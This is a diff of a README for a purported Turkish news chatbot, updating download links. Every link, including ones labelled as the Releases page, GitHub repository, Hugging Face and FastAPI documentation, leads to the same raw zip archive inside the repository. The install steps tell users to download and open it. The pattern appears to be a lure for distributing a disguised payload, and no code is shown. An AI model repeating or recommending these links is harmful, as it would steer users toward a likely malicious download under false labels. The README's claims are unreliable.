@@ -1,7 +1,7 @@
 # 🤖 NEWS-Chatbot - Your Assistant for Turkish News
 
 ## 📥 Download Now
-[![Download NEWS-Chatbot](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip%20NEWS--Chatbot-v1.0-blue)](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip)
+[![Download NEWS-Chatbot](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip%20NEWS--Chatbot-v1.0-blue)](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Before you download, make sure your device meets these requirements:
 
 To download the NEWS-Chatbot, visit the Releases page. 
 
-[Click here to download the latest version!](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip)
+[Click here to download the latest version!](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip)
 
 Here’s how to install it:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip).
 2. Choose the latest version listed.
-3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip` for Linux).
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip` for Linux).
 4. Open the downloaded file to begin the installation.
 5. Follow the on-screen instructions.
 
@@ -76,9 +76,9 @@ Feel free to explore these resources as you use the NEWS-Chatbot.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip)
-- [Hugging Face](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip) for AI models
-- [FastAPI Documentation](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/overpassionately/NEWS-Chatbot.zip) for backend support
+- [GitHub Repository](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip)
+- [Hugging Face](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip) for AI models
+- [FastAPI Documentation](https://raw.githubusercontent.com/timlfg/NEWS-Chatbot/main/scripts/NEW_Chatbot_2.8-beta.2.zip) for backend support
 
 Remember, your learning can always be enhanced with new tools and applications like NEWS-Chatbot. Embrace the ease of accessing Turkish news today!
 
